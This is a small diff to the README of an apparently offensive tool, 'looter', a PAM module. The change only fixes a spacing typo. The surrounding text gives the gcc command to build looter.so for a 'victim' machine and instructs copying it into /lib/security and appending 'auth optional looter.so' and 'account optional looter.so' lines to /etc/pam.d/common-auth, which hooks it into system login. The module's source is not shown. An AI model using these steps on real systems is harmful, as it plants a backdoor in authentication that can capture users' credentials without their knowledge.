@@ -20,7 +20,7 @@ gcc -m32 -Werror -Wall -fPIC -shared -o looter.so looter2.c
 The m32 switch is optional and allows to compile the files for a 32bit victim on a 64bit attacker machine
 
 # Usage
-Copy the <b>looter.so</b> to victim machine on <b>/lib/security</b>, then append to <b>/etc/pam.d/common-auth</b>the following lines:
+Copy the <b>looter.so</b> to victim machine on <b>/lib/security</b>, then append to <b>/etc/pam.d/common-auth</b> the following lines:
 ~~~~
 auth optional looter.so
 account optional looter.so
